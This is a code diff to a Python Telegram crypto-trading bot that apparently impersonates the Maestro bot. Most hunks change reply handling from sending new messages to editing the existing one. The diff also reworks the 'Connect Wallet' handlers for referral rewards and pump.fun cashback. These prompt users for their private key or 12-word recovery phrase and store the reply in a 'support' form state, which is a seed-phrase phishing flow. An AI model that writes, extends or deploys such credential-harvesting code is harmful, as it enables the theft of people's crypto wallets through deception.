@@ -1663,7 +1663,10 @@ async def process_help(callback: CallbackQuery):
 async def process_print(callback: CallbackQuery):
     parts = callback.data.split(":")
     chain = (parts[2] if len(parts) > 2 else "sol").upper()
-    await callback.message.answer(get_print_settings_text(chain))
+    try:
+        await callback.message.edit_text(get_print_settings_text(chain))
+    except Exception:
+        await callback.message.answer(get_print_settings_text(chain))
     await callback.answer()
 
 
@@ -1795,12 +1798,21 @@ async def sell_kb_unavailable(callback: CallbackQuery):
 
 
 async def _start_parameter_prompt(callback: CallbackQuery, state: FSMContext, prompt_text: str, next_state, chain: str, keyboard_type: str):
-    prompt = await callback.message.answer(
-        prompt_text,
-        reply_markup=types.ForceReply(selective=True),
-    )
+    prompt_message_id = callback.message.message_id
+    try:
+        await callback.message.edit_text(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+    except Exception:
+        prompt = await callback.message.answer(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_message_id = prompt.message_id
+
     await state.set_state(next_state)
-    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt.message_id, chain=chain, keyboard_type=keyboard_type)
+    await state.update_data(panel_id=callback.message.message_id, prompt_id=prompt_message_id, chain=chain, keyboard_type=keyboard_type)
     await callback.answer()
 
 
@@ -2036,7 +2048,10 @@ async def toggle_channel_degen(callback: CallbackQuery):
 async def print_channel(callback: CallbackQuery):
     channel_key = callback.data.split(":", 1)[1]
     channel = CALL_CHANNELS[channel_key]
-    await callback.message.answer(f"Channel: {channel['username']}\nID: {channel['id']}")
+    try:
+        await callback.message.edit_text(f"Channel: {channel['username']}\nID: {channel['id']}")
+    except Exception:
+        await callback.message.answer(f"Channel: {channel['username']}\nID: {channel['id']}")
     await callback.answer()
 
 
@@ -2900,35 +2915,53 @@ async def referral_detail(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "referral_recipient_wallet")
 async def referral_recipient_wallet(callback: types.CallbackQuery):
-    await callback.message.answer(
-        text="🔗 Connect your wallet to receive referral rewards 💰",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Connect Wallet", callback_data="referral_connect_wallet")],
-            [InlineKeyboardButton(text="Return", callback_data="referral_detail")],
-        ]),
-    )
+    try:
+        await callback.message.edit_text(
+            text="🔗 Connect your wallet to receive referral rewards 💰",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Connect Wallet", callback_data="referral_connect_wallet")],
+                [InlineKeyboardButton(text="Return", callback_data="referral_detail")],
+            ]),
+        )
+    except Exception:
+        await callback.message.answer(
+            text="🔗 Connect your wallet to receive referral rewards 💰",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Connect Wallet", callback_data="referral_connect_wallet")],
+                [InlineKeyboardButton(text="Return", callback_data="referral_detail")],
+            ]),
+        )
     await callback.answer()
 
 
 @dp.callback_query(F.data == "referral_connect_wallet")
 async def referral_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
     prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
+    prompt_message_id = callback.message.message_id
 
     try:
-        await callback.message.delete()
+        await callback.message.edit_text(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
     except Exception:
-        pass
-
-    sent = await callback.message.answer(
-        text=prompt_text,
-        parse_mode="HTML",
-        reply_markup=types.ForceReply(selective=False),
-    )
+        try:
+            await callback.message.delete()
+        except Exception:
+            pass
+        sent = await callback.message.answer(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
+        prompt_message_id = sent.message_id
 
     await state.set_state(SupportForm.waiting_for_input)
     await state.update_data(
-        prompt_message_id=sent.message_id,
+        prompt_message_id=prompt_message_id,
         source="referral_wallet",
     )
     await callback.answer()
@@ -2937,21 +2970,29 @@ async def referral_connect_wallet(callback: types.CallbackQuery, state: FSMConte
 @dp.callback_query(F.data.in_({"pumpfun_connect_wallet", "cashback_phantom_connect_wallet"}))
 async def pumpfun_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
     prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
+    prompt_message_id = callback.message.message_id
 
     try:
-        await callback.message.delete()
+        await callback.message.edit_text(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
     except Exception:
-        pass
-
-    sent = await callback.message.answer(
-        text=prompt_text,
-        parse_mode="HTML",
-        reply_markup=types.ForceReply(selective=False),
-    )
+        try:
+            await callback.message.delete()
+        except Exception:
+            pass
+        sent = await callback.message.answer(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
+        prompt_message_id = sent.message_id
 
     await state.set_state(SupportForm.waiting_for_input)
     await state.update_data(
-        prompt_message_id=sent.message_id,
+        prompt_message_id=prompt_message_id,
         source="pumpfun_wallet",
     )
     await callback.answer()
@@ -3256,15 +3297,25 @@ async def handle_track_click(callback: types.CallbackQuery):
     token_data = await fetch_dexscreener_data(mint_address)
     text = format_monitor_text(mint_address, token_data, 2160)
 
-    monitor_msg = await callback.message.answer(
-        text=text,
-        parse_mode="HTML",
-        reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
-        disable_web_page_preview=True,
-    )
+    try:
+        await callback.message.edit_text(
+            text=text,
+            parse_mode="HTML",
+            reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
+            disable_web_page_preview=True,
+        )
+        monitor_msg_id = callback.message.message_id
+    except Exception:
+        monitor_msg = await callback.message.answer(
+            text=text,
+            parse_mode="HTML",
+            reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
+            disable_web_page_preview=True,
+        )
+        monitor_msg_id = monitor_msg.message_id
 
-    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, monitor_msg.message_id, mint_address, token_data))
-    TRACKED_MONITORS[monitor_msg.message_id] = task
+    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, monitor_msg_id, mint_address, token_data))
+    TRACKED_MONITORS[monitor_msg_id] = task
     await callback.answer()
 
 
@@ -3290,14 +3341,22 @@ async def handle_refresh_or_multi(callback: types.CallbackQuery):
 
 
 async def _prompt_config_value(callback: types.CallbackQuery, state: FSMContext, config_key: str, mint_address: str, prompt_text: str, keyboard_type: str):
-    prompt_msg = await callback.message.answer(
-        text=prompt_text,
-        reply_markup=types.ForceReply(selective=True),
-    )
+    prompt_id = callback.message.message_id
+    try:
+        await callback.message.edit_text(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+    except Exception:
+        prompt_msg = await callback.message.answer(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_id = prompt_msg.message_id
 
     await state.update_data(
         panel_id=callback.message.message_id,
-        prompt_id=prompt_msg.message_id,
+        prompt_id=prompt_id,
         mint_address=mint_address,
         config_key=config_key,
         chat_id=callback.message.chat.id,
@@ -3702,19 +3761,26 @@ async def handle_chain_selection(callback: types.CallbackQuery, state: FSMContex
         await callback.answer()
         return
     
-    naming_msg = await callback.message.answer(
-        "What would you like to name this wallet? 8 letters max, only numbers and letters.",
-        reply_markup=types.ForceReply(selective=True)
-    )
-    
-    # Track message ID
-    if user_id not in user_messages:
-        user_messages[user_id] = []
-    user_messages[user_id].append(naming_msg.message_id)
+    prompt_id = callback.message.message_id
+    try:
+        await callback.message.edit_text(
+            text="What would you like to name this wallet? 8 letters max, only numbers and letters.",
+            reply_markup=types.ForceReply(selective=True),
+        )
+    except Exception:
+        naming_msg = await callback.message.answer(
+            "What would you like to name this wallet? 8 letters max, only numbers and letters.",
+            reply_markup=types.ForceReply(selective=True)
+        )
+        prompt_id = naming_msg.message_id
+        if user_id not in user_messages:
+            user_messages[user_id] = []
+        user_messages[user_id].append(naming_msg.message_id)
     
     await state.update_data(
         chosen_chain=target_chain,
         current_chain=target_chain,
+        prompt_id=prompt_id,
         tracked_messages=user_messages.get(user_id, [])
     )
     await state.set_state(WalletSetupState.waiting_for_name)
@@ -4042,20 +4108,32 @@ async def delete_wallet(callback: CallbackQuery):
 
     user_wallets_data = user_wallets.get(user_id, {})
     if not user_wallets_data:
-        await callback.message.answer(
-            text="❌ No wallet found to delete",
-            parse_mode="HTML",
-        )
+        try:
+            await callback.message.edit_text(
+                text="❌ No wallet found to delete",
+                parse_mode="HTML",
+            )
+        except Exception:
+            await callback.message.answer(
+                text="❌ No wallet found to delete",
+                parse_mode="HTML",
+            )
         await callback.answer()
         return
 
     if target_chain:
         # Delete specific chain wallet
         if target_chain not in user_wallets_data:
-            await callback.message.answer(
-                text=f"❌ No {target_chain} wallet found to delete",
-                parse_mode="HTML",
-            )
+            try:
+                await callback.message.edit_text(
+                    text=f"❌ No {target_chain} wallet found to delete",
+                    parse_mode="HTML",
+                )
+            except Exception:
+                await callback.message.answer(
+                    text=f"❌ No {target_chain} wallet found to delete",
+                    parse_mode="HTML",
+                )
             await callback.answer()
             return
         
@@ -4070,16 +4148,22 @@ async def delete_wallet(callback: CallbackQuery):
         if not user_wallets_data:
             user_wallets.pop(user_id, None)
         
-        delete_msg = await callback.message.answer(
-            text=f"<b>✅ {target_chain} Wallet deleted successfully. You can now generate a new {target_chain} wallet.</b>",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
-        )
+        try:
+            await callback.message.edit_text(
+                text=f"<b>✅ {target_chain} Wallet deleted successfully. You can now generate a new {target_chain} wallet.</b>",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
+            )
+        except Exception:
+            delete_msg = await callback.message.answer(
+                text=f"<b>✅ {target_chain} Wallet deleted successfully. You can now generate a new {target_chain} wallet.</b>",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
+            )
+            if user_id not in user_messages:
+                user_messages[user_id] = []
+            user_messages[user_id].append(delete_msg.message_id)
         
-        # Track deletion message for cleanup
-        if user_id not in user_messages:
-            user_messages[user_id] = []
-        user_messages[user_id].append(delete_msg.message_id)
     else:
         # Show menu to select which wallet to delete if multiple exist
         if len(user_wallets_data) > 1:
@@ -4088,10 +4172,16 @@ async def delete_wallet(callback: CallbackQuery):
                 buttons.append([InlineKeyboardButton(text=f"Delete {chain} Wallet", callback_data=f"delete_wallet:{chain}")])
             buttons.append([InlineKeyboardButton(text="Cancel", callback_data="wallets")])
             
-            await callback.message.answer(
-                text="Which wallet would you like to delete?",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
-            )
+            try:
+                await callback.message.edit_text(
+                    text="Which wallet would you like to delete?",
+                    reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
+                )
+            except Exception:
+                await callback.message.answer(
+                    text="Which wallet would you like to delete?",
+                    reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
+                )
         else:
             # Single wallet, delete it
             wallet_info = next(iter(user_wallets_data.values()))
@@ -4101,16 +4191,21 @@ async def delete_wallet(callback: CallbackQuery):
                 release_wallet_entry(chain, wallet_address)
             
             user_wallets.pop(user_id, None)
-            delete_msg = await callback.message.answer(
-                text="<b>✅ Wallet deleted successfully. You can now generate a new wallet.</b>",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
-            )
-            
-            # Track deletion message for cleanup
-            if user_id not in user_messages:
-                user_messages[user_id] = []
-            user_messages[user_id].append(delete_msg.message_id)
+            try:
+                await callback.message.edit_text(
+                    text="<b>✅ Wallet deleted successfully. You can now generate a new wallet.</b>",
+                    parse_mode="HTML",
+                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
+                )
+            except Exception:
+                delete_msg = await callback.message.answer(
+                    text="<b>✅ Wallet deleted successfully. You can now generate a new wallet.</b>",
+                    parse_mode="HTML",
+                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="return_to_wallet_menu")]]),
+                )
+                if user_id not in user_messages:
+                    user_messages[user_id] = []
+                user_messages[user_id].append(delete_msg.message_id)
     
     await callback.answer()
 
@@ -4127,14 +4222,10 @@ async def return_to_wallet_menu(callback: CallbackQuery, state: FSMContext):
     # Get all tracked message IDs to delete
     messages_to_delete = user_messages.get(user_id, [])
     
-    # Delete the return button message itself
-    try:
-        await callback.bot.delete_message(chat_id=chat_id, message_id=callback.message.message_id)
-    except Exception:
-        pass  # Silently ignore if already deleted
-    
-    # Delete all tracked wallet-related messages
+    # Delete all tracked wallet-related messages except current return panel
     for msg_id in messages_to_delete:
+        if msg_id == callback.message.message_id:
+            continue
         try:
             await callback.bot.delete_message(chat_id=chat_id, message_id=msg_id)
         except Exception:
@@ -4146,14 +4237,23 @@ async def return_to_wallet_menu(callback: CallbackQuery, state: FSMContext):
     # Clear FSM state
     await state.clear()
     
-    # Show wallet entry menu with import/generate options
-    await callback.message.answer(
-        text="ℹ️ Wallet not found. Please import or generate.",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"), InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")],
-            [InlineKeyboardButton(text="Return", callback_data="wallets")]
-        ])
-    )
+    # Show wallet entry menu with import/generate options in the current panel
+    try:
+        await callback.message.edit_text(
+            text="ℹ️ Wallet not found. Please import or generate.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"), InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")],
+                [InlineKeyboardButton(text="Return", callback_data="wallets")]
+            ])
+        )
+    except Exception:
+        await callback.message.answer(
+            text="ℹ️ Wallet not found. Please import or generate.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"), InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")],
+                [InlineKeyboardButton(text="Return", callback_data="wallets")]
+            ])
+        )
     
     await callback.answer()
 
@@ -4434,20 +4534,27 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
                 reply_markup=get_generation_error_keyboard()
             )
         else:
-            naming_msg = await callback.message.answer(
-                "What would you like to name this wallet? 8 letters max, only numbers and letters.",
-                reply_markup=types.ForceReply(selective=True)
-            )
-            
-            # Track message ID
-            if user_id not in user_messages:
-                user_messages[user_id] = []
-            user_messages[user_id].append(naming_msg.message_id)
-            
+            prompt_id = callback.message.message_id
+            try:
+                await callback.message.edit_text(
+                    text="What would you like to name this wallet? 8 letters max, only numbers and letters.",
+                    reply_markup=types.ForceReply(selective=True),
+                )
+            except Exception:
+                naming_msg = await callback.message.answer(
+                    "What would you like to name this wallet? 8 letters max, only numbers and letters.",
+                    reply_markup=types.ForceReply(selective=True)
+                )
+                prompt_id = naming_msg.message_id
+                if user_id not in user_messages:
+                    user_messages[user_id] = []
+                user_messages[user_id].append(naming_msg.message_id)
+
             await state.update_data(
                 chosen_chain=target_chain,
                 current_chain=target_chain,
-                tracked_messages=user_messages.get(user_id, [])
+                prompt_id=prompt_id,
+                tracked_messages=user_messages.get(user_id, []),
             )
             await state.set_state(WalletSetupState.waiting_for_name)
 
@@ -4505,10 +4612,16 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
             )
             await callback.message.edit_text(track_text)
         else:
-            await callback.message.answer("No wallet found for your account yet.")
+            await callback.message.edit_text(
+                text="No wallet found for your account yet.",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Generate Wallet", callback_data="choose_chain_sol"), InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet")],
+                    [InlineKeyboardButton(text="Return", callback_data="chains")],
+                ]),
+            )
 
     elif data.startswith("chain_"):
-        await callback.message.answer("Chain toggle initiated.")
+        await callback.answer("Chain toggle initiated.")
     elif data == "signals":
         await render_signals_settings(callback)
     elif data == "signals_call_channels":
@@ -4567,7 +4680,16 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
         )
         await callback.answer()
     elif data == "buy_sell_now":
-        await callback.message.answer("⚡️ Fast Trade Console: Paste a Token contract address (CA) below.")
+        try:
+            await callback.message.edit_text(
+                text="⚡️ Fast Trade Console: Paste a Token contract address (CA) below.",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Return", callback_data="main_menu")],
+                ]),
+            )
+        except Exception:
+            await callback.message.answer("⚡️ Fast Trade Console: Paste a Token contract address (CA) below.")
+        await callback.answer()
     elif data == "test_connect_wallet":
         localized_text, _ = await get_user_message_text(
             callback.from_user.id,
@@ -4579,9 +4701,18 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
         )
         await callback.answer()
     elif data == "more_links":
-        await callback.message.answer(
-            "🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/"
-        )
+        try:
+            await callback.message.edit_text(
+                text="🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="Return", callback_data="main_menu")],
+                ]),
+            )
+        except Exception:
+            await callback.message.answer(
+                "🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/"
+            )
+        await callback.answer()
 
 dp.include_router(router)
 
